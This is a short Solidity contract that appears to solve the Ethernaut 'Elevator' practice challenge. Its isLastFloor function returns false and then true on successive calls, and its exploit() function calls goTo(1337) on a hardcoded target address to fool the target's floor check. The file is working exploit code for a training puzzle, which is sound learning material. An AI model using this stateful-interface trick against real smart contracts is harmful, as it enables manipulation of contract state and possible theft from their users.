// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
  function goTo(uint) external;
}

contract Building {
    bool status = false;

    function isLastFloor(uint ) external returns(bool) {
      if(!status) {
        status = true;
        return false;
      }

      else {
        status = false;
        return true;
      }
    }

    function exploit() public {
      IElevator vulnerableContract = IElevator(0xe34193b84da948bb511215eb6A3b43a6b320EFbD);
      vulnerableContract.goTo(1337);
    }
}

